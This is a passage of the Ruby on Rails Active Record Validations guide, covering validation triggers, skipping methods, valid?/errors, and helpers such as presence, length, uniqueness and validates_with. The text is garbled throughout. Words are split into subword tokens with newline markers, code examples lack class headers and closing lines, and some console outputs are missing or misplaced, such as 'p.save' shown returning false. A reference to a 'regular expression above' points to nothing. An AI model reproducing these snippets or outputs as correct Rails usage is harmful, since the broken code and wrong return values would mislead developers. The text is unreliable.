▁Here ' s ▁a ▁summary ▁of ▁the ▁pro s ▁and ▁con s :
▁* ▁Client - side ▁validations ▁can ▁be ▁useful , ▁but ▁are ▁generally ▁un re li able ▁if ▁used < n > ▁ al one .
▁If ▁they ▁are ▁implemented ▁using ▁JavaScript , ▁they ▁may ▁be ▁bypass ed ▁if < n > ▁JavaScript ▁is ▁turn ed ▁off ▁in ▁the ▁user ' s ▁browser .
▁However , ▁if ▁combine d ▁with < n > ▁other ▁technique s , ▁client - side ▁validation ▁can ▁be ▁a ▁convenient ▁way ▁to ▁provide < n > ▁users ▁with ▁imm edia t e ▁feedback ▁as ▁they ▁use ▁your ▁site .
▁* ▁Controller - level ▁validations ▁can ▁be ▁te mp ting ▁to ▁use , ▁but ▁often ▁become < n > ▁un w i el d y ▁and ▁difficult ▁to ▁test ▁and ▁maintain .
▁When ever ▁possible , ▁it ' s ▁a ▁good < n > ▁idea ▁to ▁keep ▁your ▁controllers ▁ s k in n y , ▁as ▁it ▁will ▁make ▁your ▁application ▁a < n > ▁p le as ure ▁to ▁work ▁with ▁in ▁the ▁long ▁run .
▁Choos e ▁these ▁in ▁certain , ▁specific ▁cases .
▁It ' s ▁the ▁ o p in ion ▁of ▁the ▁Rails ▁team < n > that ▁model - level ▁validations ▁are ▁the ▁most ▁appropriate ▁in ▁most ▁c ir c um st ance s .
▁### ▁When ▁Doe s ▁Validation ▁H app en ?
▁There ▁are ▁two ▁kind s ▁of ▁Active ▁Record ▁objects : ▁those ▁that ▁correspond ▁to ▁a ▁row < n > in side ▁your ▁database ▁and ▁those ▁that ▁do ▁not .
▁When ▁you ▁create ▁a ▁fresh ▁object , ▁for < n > example ▁using ▁the ▁` new ` ▁method , ▁that ▁object ▁does ▁not ▁be long ▁to ▁the ▁database < n > y et .
▁On ce ▁you ▁call ▁` save ` ▁upon ▁that ▁object ▁it ▁will ▁be ▁saved ▁into ▁the < n > app r o p r i ate ▁database ▁table .
▁Active ▁Record ▁uses ▁the ▁` new _ record ?` ▁instance < n > method ▁to ▁determine ▁whether ▁an ▁object ▁is ▁already ▁in ▁the ▁database ▁or ▁not .
▁Consider ▁the ▁following ▁simple ▁Active ▁Record ▁class :
▁We ▁can ▁see ▁how ▁it ▁works ▁by ▁look ing ▁at ▁some ▁` rails ▁console ` ▁output :
▁ >> ▁p ▁= ▁Person . new ( name : ▁" John ▁Doe ")
▁=> ▁#< Person ▁id : ▁nil , ▁name : ▁" John ▁Doe ", ▁created _ at : ▁nil , ▁updated _ at : ▁nil >
▁ >> ▁p . new _ record ?
▁ >> ▁p . save
▁=> ▁false
▁Creat ing ▁and ▁saving ▁a ▁new ▁record ▁will ▁send ▁an ▁SQL ▁` IN S ER T ` ▁operation ▁to ▁the < n > database .
▁ Updating ▁an ▁existing ▁record ▁will ▁send ▁an ▁SQL ▁` UPDATE ` ▁operation < n > instead .
▁Validation s ▁are ▁typical ly ▁run ▁before ▁these ▁commands ▁are ▁sent ▁to ▁the < n > database .
▁If ▁any ▁validations ▁fail , ▁the ▁object ▁will ▁be ▁ marked ▁as ▁invalid ▁and < n > Active ▁Record ▁will ▁not ▁perform ▁the ▁` IN S ER T ` ▁or ▁` UPDATE ` ▁operation .
▁This ▁avoid s < n > st or ing ▁an ▁invalid ▁object ▁in ▁the ▁database .
▁You ▁can ▁choose ▁to ▁have ▁specific < n > validations ▁run ▁when ▁an ▁object ▁is ▁created , ▁saved , ▁or ▁updated .
▁C A UT I ON : ▁There ▁are ▁many ▁ways ▁to ▁change ▁the ▁state ▁of ▁an ▁object ▁in ▁the ▁database .
▁Some ▁methods ▁will ▁trigger ▁validations , ▁but ▁some ▁will ▁not .
▁This ▁means ▁that ▁it ' s < n > possibl e ▁to ▁save ▁an ▁object ▁in ▁the ▁database ▁in ▁an ▁invalid ▁state ▁if ▁you ▁are n ' t < n > ca ref ul .
▁The ▁following ▁methods ▁trigger ▁validations , ▁and ▁will ▁save ▁the ▁object ▁to ▁the < n > database ▁only ▁if ▁the ▁object ▁is ▁valid :
▁* ▁` create `
▁* ▁` create !
▁* ▁` save `
▁* ▁` save !
▁* ▁` update `
▁* ▁` update !
▁The ▁ bang ▁versions ▁( e . g . ▁` save !` ) ▁raise ▁an ▁exception ▁if ▁the ▁record ▁is ▁invalid .
▁The ▁non - bang ▁versions ▁don ' t , ▁` save ` ▁and ▁` update ` ▁return ▁` false `, < n >` create ` ▁just ▁returns ▁the ▁object .
▁### ▁S k ip p ing ▁Validation s
▁The ▁following ▁methods ▁skip ▁validations , ▁and ▁will ▁save ▁the ▁object ▁to ▁the < n > database ▁regardless ▁of ▁its ▁validity .
▁They ▁should ▁be ▁used ▁with ▁caution .
▁* ▁` d ec re ment !
▁* ▁` d ec re ment _ counter `
▁* ▁` increment !
▁* ▁` increment _ counter `
▁* ▁` t ogg le !
▁* ▁` touch `
▁* ▁` update _ all `
▁* ▁` update _ attribute `
▁* ▁` update _ column `
▁* ▁` update _ columns `
▁* ▁` update _ counter s `
▁Note ▁that ▁` save ` ▁also ▁has ▁the ▁ability ▁to ▁skip ▁validations ▁if ▁passed ▁` validate : < n > false ` ▁as ▁argument .
▁This ▁technique ▁should ▁be ▁used ▁with ▁caution .
▁* ▁` save ( validate : ▁false )`
▁### ▁` valid ?` ▁and ▁` invalid ?
▁To ▁verify ▁whether ▁or ▁not ▁an ▁object ▁is ▁valid , ▁Rails ▁uses ▁the ▁` valid ?` ▁method .
▁You ▁can ▁also ▁use ▁this ▁method ▁on ▁your ▁own . ▁` valid ?` ▁trigger s ▁your ▁validations < n > and ▁returns ▁true ▁if ▁no ▁errors ▁were ▁found ▁in ▁the ▁object , ▁and ▁false ▁otherwise .
▁As ▁you ▁saw ▁above :
▁After ▁Active ▁Record ▁has ▁perform ed ▁validations , ▁any ▁errors ▁found ▁can ▁be ▁access ed < n > through ▁the ▁` errors . messages ` ▁instance ▁method , ▁which ▁returns ▁a ▁collection ▁of ▁errors .
▁By ▁definition , ▁an ▁object ▁is ▁valid ▁if ▁this ▁collection ▁is ▁empty ▁after ▁running < n > validations .
▁Note ▁that ▁an ▁object ▁ instantiated ▁with ▁` new ` ▁will ▁not ▁report ▁errors ▁even ▁if ▁it ' s < n > technical ly ▁invalid , ▁because ▁validations ▁are ▁not ▁run ▁when ▁using ▁` new `.
▁ >> ▁p ▁= ▁Person . new
▁# ▁=> ▁#< Person ▁id : ▁nil , ▁name : ▁nil >
▁ >> ▁p . errors . messages
▁ >> ▁p . valid ?
▁# ▁=> ▁ { name : [ " can ' t ▁be ▁blank "] }
▁ >> ▁p ▁= ▁Person . create
▁ >> ▁p . save !
▁# ▁=> ▁ActiveRecord :: RecordInvalid : ▁Validation ▁failed : ▁Name ▁can ' t ▁be ▁blank
▁ >> ▁Person . create !
▁` invalid ?` ▁is ▁simply ▁the ▁inverse ▁of ▁` valid ?` .
▁It ▁trigger s ▁your ▁validations ,< n > return ing ▁true ▁if ▁any ▁errors ▁were ▁found ▁in ▁the ▁object , ▁and ▁false ▁otherwise .
▁### ▁` errors [ ]`
▁To ▁verify ▁whether ▁or ▁not ▁a ▁particular ▁attribute ▁of ▁an ▁object ▁is ▁valid , ▁you ▁can < n > use ▁` errors [: attribute ]` .
▁It ▁returns ▁an ▁array ▁of ▁all ▁the ▁errors ▁for < n >`: attribute `.
▁If ▁there ▁are ▁no ▁errors ▁on ▁the ▁specified ▁attribute , ▁an ▁empty ▁array < n > is ▁returned .
▁This ▁method ▁is ▁only ▁useful ▁ _ after _ ▁validations ▁have ▁been ▁run , ▁because ▁it ▁only < n > inspect s ▁the ▁errors ▁collection ▁and ▁does ▁not ▁trigger ▁validations ▁itself .
▁It ' s < n > different ▁from ▁the ▁` ActiveRecord :: Base # invalid ?` ▁method ▁explained ▁above ▁because < n > it ▁does n ' t ▁verify ▁the ▁validity ▁of ▁the ▁object ▁as ▁a ▁whole .
▁It ▁only ▁check s ▁to ▁see < n > w hether ▁there ▁are ▁errors ▁found ▁on ▁an ▁individual ▁attribute ▁of ▁the ▁object .
▁ >> ▁Person . new . errors [: name ] . any ?
▁ >> ▁Person . create . errors [: name ] . any ?
▁We ' ll ▁cover ▁validation ▁errors ▁in ▁greater ▁depth ▁in ▁the ▁[ W or k ing ▁with ▁Validation < n > Error s ](# working - with - validation - errors ) ▁section .
▁For ▁now , ▁let ' s ▁turn ▁to ▁the < n > built - in ▁validation ▁helpers ▁that ▁Rails ▁provides ▁by ▁default .
▁Validation ▁ Helpers
▁--------------- ---
▁Active ▁Record ▁offer s ▁many ▁pre - defined ▁validation ▁helpers ▁that ▁you ▁can ▁use < n > directly ▁inside ▁your ▁class ▁definition s .
▁These ▁helpers ▁provide ▁common ▁validation < n > ru le s .
▁Every ▁time ▁a ▁validation ▁fails , ▁an ▁error ▁message ▁is ▁added ▁to ▁the ▁object ' s < n >` errors ` ▁collection , ▁and ▁this ▁message ▁is ▁ associated ▁with ▁the ▁attribute ▁being < n > validate d .
▁ Each ▁helper ▁accept s ▁an ▁arbitrar y ▁number ▁of ▁attribute ▁names , ▁so ▁with ▁a ▁single < n > line ▁of ▁code ▁you ▁can ▁add ▁the ▁same ▁kind ▁of ▁validation ▁to ▁sever al ▁attributes .
▁All ▁of ▁them ▁accept ▁the ▁`: on ` ▁and ▁`: message ` ▁options , ▁which ▁define ▁when ▁the < n > validation ▁should ▁be ▁run ▁and ▁what ▁message ▁should ▁be ▁added ▁to ▁the ▁` errors `< n > collection ▁if ▁it ▁fails , ▁respectively .
▁The ▁`: on ` ▁option ▁take s ▁one ▁of ▁the ▁values < n >`: create ` ▁or ▁`: update `.
▁There ▁is ▁a ▁default ▁error < n > message ▁for ▁each ▁one ▁of ▁the ▁validation ▁helpers .
▁These ▁messages ▁are ▁used ▁when < n > the ▁`: message ` ▁option ▁is n ' t ▁specified .
▁Let ' s ▁take ▁a ▁look ▁at ▁each ▁one ▁of ▁the < n > available ▁helpers .
▁### ▁` acceptance `
▁This ▁method ▁validates ▁that ▁a ▁checkbox ▁on ▁the ▁user ▁interface ▁was ▁check ed ▁when ▁a < n > form ▁was ▁submitted .
▁This ▁is ▁typical ly ▁used ▁when ▁the ▁user ▁needs ▁to ▁a g re e ▁to ▁your < n > application ' s ▁terms ▁of ▁ service , ▁confirm ▁reading ▁some ▁text , ▁or ▁any ▁similar < n > concept .
▁This ▁validation ▁is ▁very ▁specific ▁to ▁web ▁applications ▁and ▁this < n > ' acceptance ' ▁does ▁not ▁need ▁to ▁be ▁record ed ▁any where ▁in ▁your ▁database ▁( if ▁you < n > do n ' t ▁have ▁a ▁field ▁for ▁it , ▁the ▁helper ▁will ▁just ▁create ▁a ▁virtual ▁attribute ).
▁validates ▁: ter m s _ of _ service , ▁ acceptance : ▁true
▁The ▁default ▁error ▁message ▁for ▁this ▁helper ▁is ▁_" must ▁be ▁accepted " _ .
▁It ▁can ▁receive ▁an ▁`: accept ` ▁option , ▁which ▁determine s ▁the ▁value ▁that ▁will ▁be < n > co n side r ed ▁ acceptance .
▁It ▁defaults ▁to ▁ "1" ▁and ▁can ▁be ▁easily ▁changed .
▁validates ▁: ter m s _ of _ service , ▁ acceptance : ▁ { ▁accept : ▁' y es ' ▁ }
▁### ▁` validates _ associated `
▁You ▁should ▁use ▁this ▁helper ▁when ▁your ▁model ▁has ▁associations ▁with ▁other ▁models < n > and ▁they ▁also ▁need ▁to ▁be ▁validate d .
▁When ▁you ▁try ▁to ▁save ▁your ▁object , ▁` valid ?` < n > will ▁be ▁called ▁upon ▁each ▁one ▁of ▁the ▁ associated ▁objects .
▁class ▁ Library ▁< ▁ActiveRecord :: Base
▁has _ many ▁: books
▁validates _ associated ▁: books
▁This ▁validation ▁will ▁work ▁with ▁all ▁of ▁the ▁association ▁types .
▁C A UT I ON : ▁Do n ' t ▁use ▁` validates _ associated ` ▁on ▁both ▁end s ▁of ▁your ▁associations .
▁They ▁would ▁call ▁each ▁other ▁in ▁an ▁in f in ite ▁loop .
▁The ▁default ▁error ▁message ▁for ▁` validates _ associated ` ▁is ▁_" is ▁invalid " _ .
▁Note < n > that ▁each ▁ associated ▁object ▁will ▁contain ▁its ▁own ▁` errors ` ▁collection ; ▁errors ▁do < n > not ▁b u b b le ▁up ▁to ▁the ▁calling ▁model .
▁### ▁` confirmation `
▁You ▁should ▁use ▁this ▁helper ▁when ▁you ▁have ▁two ▁text ▁fields ▁that ▁should ▁receive < n > exactly ▁the ▁same ▁content .
▁For ▁example , ▁you ▁may ▁want ▁to ▁confirm ▁an ▁email ▁address < n > or ▁a ▁password .
▁This ▁validation ▁creates ▁a ▁virtual ▁attribute ▁who se ▁name ▁is ▁the < n > name ▁of ▁the ▁field ▁that ▁has ▁to ▁be ▁ confirmed ▁with ▁" _ confirmation " ▁app end ed .
▁validates ▁: email , ▁confirmation : ▁true
▁In ▁your ▁view ▁template ▁you ▁could ▁use ▁something ▁like
▁<%= ▁text _ field ▁: person , ▁: email ▁%>
▁<%= ▁text _ field ▁: person , ▁: email _ confirmation ▁%>
▁This ▁check ▁is ▁perform ed ▁only ▁if ▁` email _ confirmation ` ▁is ▁not ▁` nil `.
▁To ▁require < n > confirmation , ▁make ▁sure ▁to ▁add ▁a ▁presence ▁check ▁for ▁the ▁confirmation ▁attribute < n > ( we ' ll ▁take ▁a ▁look ▁at ▁` presence ` ▁later ▁on ▁this ▁guide ) :
▁validates ▁: email _ confirmation , ▁presence : ▁true
▁The ▁default ▁error ▁message ▁for ▁this ▁helper ▁is ▁_" do es n ' t ▁match ▁confirmation " _ .
▁### ▁` ex c l us ion `
▁This ▁helper ▁validates ▁that ▁the ▁attributes ' ▁values ▁are ▁not ▁included ▁in ▁a ▁given < n > set .
▁In ▁fact , ▁this ▁set ▁can ▁be ▁any ▁e numerable ▁object .
▁class ▁ Account ▁< ▁ActiveRecord :: Base
▁validates ▁: sub domain , ▁excl us ion : ▁ { ▁in : ▁% w ( www ▁us ▁ ca ▁ j p ),
▁message : ▁" % { value } ▁is ▁reserved . "
▁The ▁` ex c l us ion ` ▁helper ▁has ▁an ▁option ▁`: in ` ▁that ▁receive s ▁the ▁set ▁of ▁values ▁that < n > will ▁not ▁be ▁accepted ▁for ▁the ▁validate d ▁attributes .
▁The ▁`: in ` ▁option ▁has ▁an < n > alias ▁called ▁`: with in ` ▁that ▁you ▁can ▁use ▁for ▁the ▁same ▁purpose , ▁if ▁you ' d ▁like ▁to . < n >
▁This ▁example ▁uses ▁the ▁`: message ` ▁option ▁to ▁show ▁how ▁you ▁can ▁include ▁the < n > attribute ' s ▁value .
▁The ▁default ▁error ▁message ▁is ▁_" is ▁reserved " _ .
▁### ▁` format `
▁This ▁helper ▁validates ▁the ▁attributes ' ▁values ▁by ▁testing ▁whether ▁they ▁match ▁a < n > g ive n ▁regular ▁expression , ▁which ▁is ▁specified ▁using ▁the ▁`: with ` ▁option .
▁validates ▁: le g ac y _ code , ▁format : ▁ { ▁with : ▁/ \ A [ a - z A - Z ] + \ z / ,
▁message : ▁" only ▁allows ▁letter s " ▁ }
▁The ▁default ▁error ▁message ▁is ▁_" is ▁invalid " _ .
▁### ▁` i nclusion `
▁This ▁helper ▁validates ▁that ▁the ▁attributes ' ▁values ▁are ▁included ▁in ▁a ▁given ▁set .
▁class ▁Co ff e e ▁< ▁ActiveRecord :: Base
▁validates ▁: size , ▁inclusion : ▁ { ▁in : ▁% w ( small ▁m ed i um ▁large ),
▁The ▁` i nclusion ` ▁helper ▁has ▁an ▁option ▁`: in ` ▁that ▁receive s ▁the ▁set ▁of ▁values ▁that < n > will ▁be ▁accepted .
▁The ▁`: in ` ▁option ▁has ▁an ▁alias ▁called ▁`: with in ` ▁that ▁you ▁can < n > use ▁for ▁the ▁same ▁purpose , ▁if ▁you ' d ▁like ▁to .
▁The ▁previous ▁example ▁uses ▁the < n >`: message ` ▁option ▁to ▁show ▁how ▁you ▁can ▁include ▁the ▁attribute ' s ▁value .
▁The ▁default ▁error ▁message ▁for ▁this ▁helper ▁is ▁_" is ▁not ▁included ▁in ▁the ▁list " _ .
▁### ▁` length `
▁This ▁helper ▁validates ▁the ▁length ▁of ▁the ▁attributes ' ▁values .
▁It ▁provides ▁a < n > v ar i et y ▁of ▁options , ▁so ▁you ▁can ▁specify ▁length ▁constraints ▁in ▁different ▁ways :
▁validates ▁: name , ▁length : ▁ { ▁minimum : ▁2 ▁ }
▁validates ▁: b io , ▁length : ▁ { ▁ maximum : ▁50 0 ▁ }
▁validates ▁: password , ▁length : ▁ { ▁in : ▁6 . . 20 ▁ }
▁validates ▁: re g ist r ation _ number , ▁length : ▁ { ▁is : ▁6 ▁ }
▁The ▁possible ▁length ▁constraint ▁options ▁are :
▁* ▁`: minimum ` ▁- ▁The ▁attribute ▁cannot ▁have ▁less ▁than ▁the ▁specified ▁length .
▁* ▁`: maximum ` ▁- ▁The ▁attribute ▁cannot ▁have ▁more ▁than ▁the ▁specified ▁length .
▁* ▁`: in ` ▁( or ▁`: with in `) ▁- ▁The ▁attribute ▁length ▁must ▁be ▁included ▁in ▁a ▁given < n > ▁in ter v al .
▁The ▁value ▁for ▁this ▁option ▁must ▁be ▁a ▁range .
▁* ▁`: is ` ▁- ▁The ▁attribute ▁length ▁must ▁be ▁equal ▁to ▁the ▁given ▁value .
▁The ▁default ▁error ▁messages ▁depend ▁on ▁the ▁type ▁of ▁length ▁validation ▁being < n > perform ed .
▁You ▁can ▁person al ize ▁these ▁messages ▁using ▁the ▁`: wrong _ length `, < n >`: to o _ long `, ▁and ▁`: to o _ s h or t ` ▁options ▁and ▁` % { count } ` ▁as ▁a ▁place h ol d er ▁for ▁the < n > number ▁corresponding ▁to ▁the ▁length ▁constraint ▁being ▁used .
▁You ▁can ▁ still ▁use ▁the < n >`: message ` ▁option ▁to ▁specify ▁an ▁error ▁message .
▁validates ▁: b io , ▁length : ▁ { ▁ maximum : ▁100 0,
▁This ▁helper ▁count s ▁characters ▁by ▁default , ▁but ▁you ▁can ▁ split ▁the ▁value ▁in ▁a < n > different ▁way ▁using ▁the ▁`: token ize r ` ▁option :
▁class ▁E s s a y ▁< ▁ActiveRecord :: Base
▁validates ▁: content , ▁length : ▁ {
▁minimum : ▁30 0,
▁ maximum : ▁4 00 ,
▁too _ s h or t : ▁" must ▁have ▁at ▁least ▁% { count } ▁words ",
▁Note ▁that ▁the ▁default ▁error ▁messages ▁are ▁plural ▁( e . g . , ▁" is ▁too ▁short ▁( minimum < n > is ▁% { count } ▁characters ) ") .
▁For ▁this ▁reason , ▁when ▁`: minimum ` ▁is ▁1 ▁you ▁should < n > provide ▁a ▁person al ize d ▁message ▁or ▁use ▁` presence : ▁true ` ▁instead .
▁### ▁` n umeric al ity `
▁This ▁helper ▁validates ▁that ▁your ▁attributes ▁have ▁only ▁ n umeric ▁values .
▁By < n > default , ▁it ▁will ▁match ▁an ▁optional ▁sign ▁followed ▁by ▁an ▁in t e gr al ▁or ▁f lo at ing < n > point ▁number .
▁To ▁specify ▁that ▁only ▁in t e gr al ▁number s ▁are ▁allowed ▁set < n >`: only _ integer ` ▁to ▁true .
▁If ▁you ▁set ▁`: only _ integer ` ▁to ▁` true `, ▁the n ▁it ▁will ▁use ▁the
▁regular ▁expression ▁to ▁validate ▁the ▁attribute ' s ▁value .
▁Otherwise , ▁it ▁will ▁try ▁to < n > co n ve r t ▁the ▁value ▁to ▁a ▁number ▁using ▁` F lo at `.
▁WARNING . ▁Note ▁that ▁the ▁regular ▁expression ▁above ▁allows ▁a ▁tr ailing ▁new line < n > character .
▁class ▁P la y er ▁< ▁ActiveRecord :: Base
▁validates ▁: point s , ▁ n umeric al ity : ▁true
▁validates ▁: g am es _ play ed , ▁ n umeric al ity : ▁ { ▁only _ integer : ▁true ▁ }
▁Be side s ▁`: only _ integer `, ▁this ▁helper ▁also ▁accept s ▁the ▁following ▁options ▁to ▁add < n > constraints ▁to ▁accept able ▁values :
▁* ▁`: g re at er _ th an ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁greater ▁than ▁the ▁supplied < n > ▁value .
▁The ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁greater ▁than < n > ▁% { count } " _ .
▁* ▁`: g re at er _ th an _ or _ equal _ to ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁greater ▁than ▁or < n > ▁equal ▁to ▁the ▁supplied ▁value .
▁The ▁default ▁error ▁message ▁for ▁this ▁option ▁is < n > ▁_" must ▁be ▁greater ▁than ▁or ▁equal ▁to ▁% { count } " _ .
▁* ▁`: equal _ to ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁equal ▁to ▁the ▁supplied ▁value .
▁The < n > ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁equal ▁to ▁% { count } " _ .
▁* ▁`: less _ th an ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁less ▁than ▁the ▁supplied ▁value .
▁The < n > ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁less ▁than ▁% { count } " _ .
▁* ▁`: less _ th an _ or _ equal _ to ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁less ▁than ▁or ▁equal ▁the < n > ▁supplied ▁value .
▁The ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁less < n > ▁than ▁or ▁equal ▁to ▁% { count } " _ .
▁* ▁`: o d d ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁an ▁odd ▁number ▁if ▁set ▁to ▁true .
▁The < n > ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁odd " _ .
▁* ▁`: even ` ▁- ▁Specif ies ▁the ▁value ▁must ▁be ▁an ▁even ▁number ▁if ▁set ▁to ▁true .
▁The < n > ▁default ▁error ▁message ▁for ▁this ▁option ▁is ▁_" must ▁be ▁even " _ .
▁The ▁default ▁error ▁message ▁is ▁_" is ▁not ▁a ▁number " _ .
▁### ▁` presence `
▁This ▁helper ▁validates ▁that ▁the ▁specified ▁attributes ▁are ▁not ▁empty .
▁It ▁uses ▁the < n >` blank ?` ▁method ▁to ▁check ▁if ▁the ▁value ▁is ▁either ▁` nil ` ▁or ▁a ▁blank ▁string , ▁that < n > is , ▁a ▁string ▁that ▁is ▁either ▁empty ▁or ▁consist s ▁of ▁whitespace .
▁validates ▁: name , ▁: login , ▁: email , ▁presence : ▁true
▁If ▁you ▁want ▁to ▁be ▁sure ▁that ▁an ▁association ▁is ▁present , ▁you ' ll ▁need ▁to ▁test < n > w hether ▁the ▁ associated ▁object ▁itself ▁is ▁present , ▁and ▁not ▁the ▁foreign ▁key ▁used < n > to ▁map ▁the ▁association .
▁class ▁L ine It em ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: order
▁validates ▁: order , ▁presence : ▁true
▁In ▁order ▁to ▁validate ▁ associated ▁records ▁who se ▁presence ▁is ▁required , ▁you ▁must < n > spec ify ▁the ▁`: inverse _ of ` ▁option ▁for ▁the ▁association :
▁has _ many ▁: line _ item s , ▁inverse _ of : ▁: order
▁If ▁you ▁validate ▁the ▁presence ▁of ▁an ▁object ▁ associated ▁via ▁a ▁` has _ one ` ▁or < n >` has _ many ` ▁relationship , ▁it ▁will ▁check ▁that ▁the ▁object ▁is ▁ n either ▁` blank ?` ▁no r < n >` marked _ for _ destruction ?` .
▁### ▁` abs ence `
▁This ▁helper ▁validates ▁that ▁the ▁specified ▁attributes ▁are ▁ abs ent .
▁It ▁uses ▁the < n >` present ?` ▁method ▁to ▁check ▁if ▁the ▁value ▁is ▁not ▁either ▁nil ▁or ▁a ▁blank ▁string , ▁that < n > is , ▁a ▁string ▁that ▁is ▁either ▁empty ▁or ▁consist s ▁of ▁whitespace .
▁validates ▁: name , ▁: login , ▁: email , ▁absence : ▁true
▁If ▁you ▁want ▁to ▁be ▁sure ▁that ▁an ▁association ▁is ▁ abs ent , ▁you ' ll ▁need ▁to ▁test < n > w hether ▁the ▁ associated ▁object ▁itself ▁is ▁ abs ent , ▁and ▁not ▁the ▁foreign ▁key ▁used < n > to ▁map ▁the ▁association .
▁validates ▁: order , ▁absence : ▁true
▁In ▁order ▁to ▁validate ▁ associated ▁records ▁who se ▁absence ▁is ▁required , ▁you ▁must < n > spec ify ▁the ▁`: inverse _ of ` ▁option ▁for ▁the ▁association :
▁If ▁you ▁validate ▁the ▁absence ▁of ▁an ▁object ▁ associated ▁via ▁a ▁` has _ one ` ▁or < n >` has _ many ` ▁relationship , ▁it ▁will ▁check ▁that ▁the ▁object ▁is ▁ n either ▁` present ?` ▁no r < n >` marked _ for _ destruction ?` .
▁S ince ▁` false . present ?` ▁is ▁false , ▁if ▁you ▁want ▁to ▁validate ▁the ▁absence ▁of ▁a ▁boolean < n > field ▁you ▁should ▁use ▁` validates ▁: field _ name , ▁excl us ion : ▁ { ▁in : ▁[ true , ▁false ] ▁}` .
▁The ▁default ▁error ▁message ▁is ▁_" must ▁be ▁blank " _ .
▁### ▁` uniqueness `
▁This ▁helper ▁validates ▁that ▁the ▁attribute ' s ▁value ▁is ▁unique ▁right ▁before ▁the < n > object ▁get s ▁saved .
▁It ▁does ▁not ▁create ▁a ▁uniqueness ▁constraint ▁in ▁the ▁database ,< n > so ▁it ▁may ▁happen ▁that ▁two ▁different ▁database ▁connection s ▁create ▁two ▁records < n > with ▁the ▁same ▁value ▁for ▁a ▁column ▁that ▁you ▁intend ▁to ▁be ▁unique .
▁To ▁avoid ▁that ,< n > you ▁must ▁create ▁a ▁unique ▁index ▁on ▁both ▁columns ▁in ▁your ▁database .
▁See < n >[ the ▁MySQL ▁m an u al ]( http :// dev . mysql . com / doc / ref ma n / 5 . 6 / en / multiple - column - index es . html )< n > for ▁more ▁details ▁about ▁multiple ▁column ▁index es .
▁validates ▁: email , ▁uniqueness : ▁true
▁The ▁validation ▁happens ▁by ▁perform ing ▁an ▁SQL ▁query ▁into ▁the ▁model ' s ▁table ,< n > search ing ▁for ▁an ▁existing ▁record ▁with ▁the ▁same ▁value ▁in ▁that ▁attribute .
▁There ▁is ▁a ▁`: scope ` ▁option ▁that ▁you ▁can ▁use ▁to ▁specify ▁other ▁attributes ▁that < n > a re ▁used ▁to ▁limit ▁the ▁uniqueness ▁check :
▁class ▁H o li day ▁< ▁ActiveRecord :: Base
▁validates ▁: name , ▁uniqueness : ▁ { ▁scope : ▁: year ,
▁message : ▁" s h o ul d ▁happen ▁once ▁per ▁ year " ▁ }
▁There ▁is ▁also ▁a ▁`: case _ sensitive ` ▁option ▁that ▁you ▁can ▁use ▁to ▁define ▁whether ▁the < n > uniqueness ▁constraint ▁will ▁be ▁case ▁ sensitive ▁or ▁not .
▁This ▁option ▁defaults ▁to < n > true .
▁validates ▁: name , ▁uniqueness : ▁ { ▁case _ sensitive : ▁false ▁ }
▁WARNING . ▁Note ▁that ▁some ▁database s ▁are ▁configured ▁to ▁perform ▁case - insensitive < n > search es ▁any way .
▁The ▁default ▁error ▁message ▁is ▁_" has ▁already ▁been ▁take n " _ .
▁### ▁` validates _ with `
▁This ▁helper ▁passes ▁the ▁record ▁to ▁a ▁separate ▁class ▁for ▁validation .
▁class ▁G oodnessValidator ▁< ▁ ActiveModel :: Validator
▁def ▁validate ( record )
▁if ▁record . first _ name ▁== ▁" E v il "
▁record . errors [: base ] ▁< < ▁" This ▁person ▁is ▁ evi l "
▁validates _ with ▁G oodnessValidator
▁NOTE : ▁ Error s ▁added ▁to ▁` record . errors [: base ]` ▁relate ▁to ▁the ▁state ▁of ▁the ▁record < n > as ▁a ▁whole , ▁and ▁not ▁to ▁a ▁specific ▁attribute .
▁The ▁` validates _ with ` ▁helper ▁take s ▁a ▁class , ▁or ▁a ▁list ▁of ▁classes ▁to ▁use ▁for < n > validation .
▁There ▁is ▁no ▁default ▁error ▁message ▁for ▁` validates _ with `.
▁You ▁must < n > ma n u ally ▁add ▁errors ▁to ▁the ▁record ' s ▁errors ▁collection ▁in ▁the ▁validator ▁class .
▁To ▁implement ▁the ▁validate ▁method , ▁you ▁must ▁have ▁a ▁` record ` ▁parameter ▁defined ,< n > which ▁is ▁the ▁record ▁to ▁be ▁validate d .
▁Like ▁all ▁other ▁validations , ▁` validates _ with ` ▁take s ▁the ▁`: if `, ▁`: unless ` ▁and < n >`: on ` ▁options .
▁If ▁you ▁pass ▁any ▁other ▁options , ▁it ▁will ▁send ▁those ▁options ▁to ▁the < n > valid at or ▁class ▁as ▁` options ` :
▁if ▁options [: field s ] . any ? {
▁| field | ▁record . s end ( field ) ▁== ▁" E v il " ▁ }
▁validates _ with ▁G oodnessValidator , ▁fields : ▁[ : first _ name , ▁: last _ name ]
▁Note ▁that ▁the ▁validator ▁will ▁be ▁initialize d ▁* only ▁once * ▁for ▁the ▁whole ▁application < n > life ▁cycle , ▁and ▁not ▁on ▁each ▁validation ▁run , ▁so ▁be ▁careful ▁about ▁using ▁instance < n > variable s ▁inside ▁it .
▁If ▁your ▁validator ▁is ▁complex ▁enough ▁that ▁you ▁want ▁instance ▁variables , ▁you ▁can < n > e as ily ▁use ▁a ▁plain ▁old ▁Ruby ▁object ▁instead :
▁validate ▁do ▁| person |
▁G oodnessValidator . new ( person ). validate
▁class ▁G oodnessValidator
▁def ▁initialize ( person )
▁@ person ▁= ▁person
▁def ▁validate
▁if ▁some _ com p le x _ condition _ involving _ i v ar s _ and _ private _ methods ?
▁@ person . errors [: base ] ▁< < ▁" This ▁person ▁is ▁ evi l "
▁### ▁` validates _ each `
▁This ▁helper ▁validates ▁attributes ▁again st ▁a ▁block .
▁It ▁does n ' t ▁have ▁a ▁pre defined < n > validation ▁function .
